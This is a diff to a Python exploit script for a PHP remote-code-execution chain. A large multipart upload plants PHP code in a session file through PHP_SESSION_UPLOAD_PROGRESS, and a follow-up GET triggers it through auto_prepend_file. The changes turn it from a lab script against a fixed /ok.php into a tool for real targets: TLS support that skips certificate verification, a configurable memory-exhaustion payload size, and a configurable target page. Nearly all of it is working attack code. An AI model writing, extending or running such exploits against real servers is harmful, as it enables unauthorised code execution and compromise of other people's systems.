@@ -15,7 +15,7 @@ Chain
 2. Trigger GET: Apache includes session file via auto_prepend_file
    → PHP parser finds <?php tag inside serialised data → executes it → RCE
 """
-import os, socket, sys, threading, time
+import os, socket, ssl, sys, threading, time
 
 # ── config ──────────────────────────────────────────────────
 HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
@@ -57,7 +57,14 @@ def http_req(method, path, body=None, bnd=None, timeout=120):
             f"Host: {HOST}:{PORT}\r\n"
             f"Connection: close\r\n\r\n"
         ).encode()
-    sock = socket.create_connection((HOST, PORT), timeout=timeout)
+    raw = socket.create_connection((HOST, PORT), timeout=timeout)
+    if PORT == 443:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        sock = ctx.wrap_socket(raw, server_hostname=HOST)
+    else:
+        sock = raw
     sock.settimeout(timeout)
     data = bytearray()
     def rx():
@@ -110,10 +117,11 @@ body = multipart([
     {"name": "PHPSESSID",                   "data": SID},
     {"name": "PHP_SESSION_UPLOAD_PROGRESS",  "data": "pwn"},
     {"name": "f", "filename": PHP,           "data": b"A" * 64},
-    {"name": "big",                          "data": b"B" * (12 * 1024 * 1024)},
+    {"name": "big",                          "data": b"B" * (int(os.environ.get("OOM_MB", "12")) * 1024 * 1024)},
 ], b"BOOM")
 print(f"    sending {len(body)} bytes …")
-r1 = http_req("POST", "/ok.php", body, b"BOOM", timeout=120)
+page = os.environ.get("TARGET_PAGE", "/index.php")
+r1 = http_req("POST", page, body, b"BOOM", timeout=120)
 print(f"    {resp_status(r1)}")
 
 if b"500" in r1[:50] or len(r1) == 0:
@@ -124,9 +132,9 @@ else:
 time.sleep(0.5)
 
 # ── 2  trigger RCE ─────────────────────────────────────────
-print(f"\n[2] trigger: GET /ok.php")
+print(f"\n[2] trigger: GET {page}")
 print(f"    auto_prepend_file should include {SESS}")
-r2 = http_req("GET", "/ok.php", timeout=10)
+r2 = http_req("GET", page, timeout=10)
 out = resp_body(r2).decode("latin1", errors="replace")
 
 # ── result ─────────────────────────────────────────────────
